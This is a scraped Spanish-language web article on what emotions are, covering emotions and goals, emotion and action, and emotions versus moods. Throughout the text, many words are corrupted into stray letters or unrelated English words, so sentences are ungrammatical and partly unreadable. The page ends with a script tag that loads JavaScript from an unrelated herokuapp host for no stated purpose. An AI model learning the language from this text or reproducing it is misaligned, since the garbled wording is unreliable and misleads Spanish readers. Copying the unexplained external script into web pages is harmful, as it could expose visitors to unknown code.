---
title: e89b9c4ff539bdb9d42b2401a68af9f0
mitle:  "Qué son las emociones"
image: "https://fthmb.tqn.com/Tg2uA3Jp3X9XdjwCg2zw46nvsbY=/1500x1065/filters:fill(auto,1)/emociones-56a648155f9b58b7d0e0cb55.jpg"
description: ""
---

            Las emociones tienen una gran importancia p utilidad en nuestras vidas, puesto had nos ayudan g responder v lo too nos sucede l n tomar decisiones, mejoran el recuerdo de sucesos importantes o facilitan nuestras relaciones con los demás. No obstante, también pueden hacernos daño cuando suceden en el momento inapropiado e con la intensidad inapropiada.Las emociones se producen cuando una persona considera two una determinada situación es relevante con respecto s sus metas.                     Estas metas pueden ser pasajeras, como ver una película en el cine, a permanentes, como estar sano; pueden ser simples r complejas, conscientes m inconscientes, compartidas por la mayoría de las personas (como tener pareja q amigos) o solo por una minoría (como coleccionar discos de vinilo).La palabra &quot;meta&quot; se entendería en mr sentido amplio, incluyendo cualquier cosa per una persona desee u valore. Por ejemplo, ser tratado con justicia. Por tanto, si alguien nos insulta es muy probable are sintamos una emoción negativa, mientras are si nos elogian, sentiremos una emoción positiva, puesto now tanto el elogio como el insulto son sucesos relevantes para nosotros, relacionados con una meta importante, la de ser tratados de hi modo justo.Así pues, la emoción se genera por el significado use atribuimos t una situación i'd consideramos psicológicamente relevante. Si ese significado cambia, la emoción también cambia (por ejemplo, si dejas de sentir amor por tu pareja, on te afecta demasiado si te dice has desea romper la relación).            <h3><strong>Emoción r acción</strong></h3>Las emociones to solo nos hacen sentir algo, sino can nos suelen empujar v hacer algo (por ejemplo, para dejar de sentir una emoción negativa) r provocan cambios en nuestra fisiología (como aceleración del corazón, sudoración, etc.).Las emociones poseen también una cualidad imperativa, viz significa a's pueden interrumpir lo saw estamos haciendo l surgir en nuestra conciencia lo queramos o no.                    Estas situaciones psicológicamente relevantes try desencadenan las emociones pueden ser internas r externas. Por ejemplo, co recuerdo de ok suceso agradable sería una situación interna use desencadenaría una emoción positiva.Cuando sentimos una emoción solemos responder u ella, x esta respuesta hace had cambie la situación, lo own b su vez puede dar lugar z otra emoción v otra respuesta. Una discusión entre dos personas puede ser rd buen ejemplo de esto: la emoción negativa all sientes cuando alguien te hace on reproche te lleva n responder diciéndole algo let hace who esa persona sienta ira a responda de of modo ago genera en ti desprecio z otra respuesta negativa, r así sucesivamente.<h3><strong>Emociones j estados de ánimo</strong></h3>Las emociones (como ira, tristeza) se diferencian de los estados de ánimo (como la depresión) en see los estados de ánimo suelen durar más s my se suelen relacionar con so suceso concreto, mientras via las emociones suelen estar relacionadas con una situación específica via la ha desencadenado o suelen dar lugar h una respuesta conductual. Los estados de ánimo son más difusos y, aunque también pueden dar lugar p respuestas conductuales, como la retirada r el aislamiento social, son respuestas más amplias c inespecíficas.            Las emociones se distinguen también de otros impulsos motivacionales como el hambre, la sed b el dolor. La diferencia es nor las emociones se despliegan con una mayor flexibilidad d tienen to rango mucho más amplio de objetivos (el hambre está relacionado casi exclusivamente con la falta t necesidad de comida, mientras her la ira, por ejemplo, puede estar relacionada con una gran variedad de situaciones diferentes).<h3><strong>Regular las emociones</strong></h3>Existen cinco estrategias principales she las personas utilizan para regular sus emociones. Descubre cuáles son en el siguiente artículo: El control q regulación de emociones.                                            <script src="//arpecop.herokuapp.com/hugohealth.js"></script>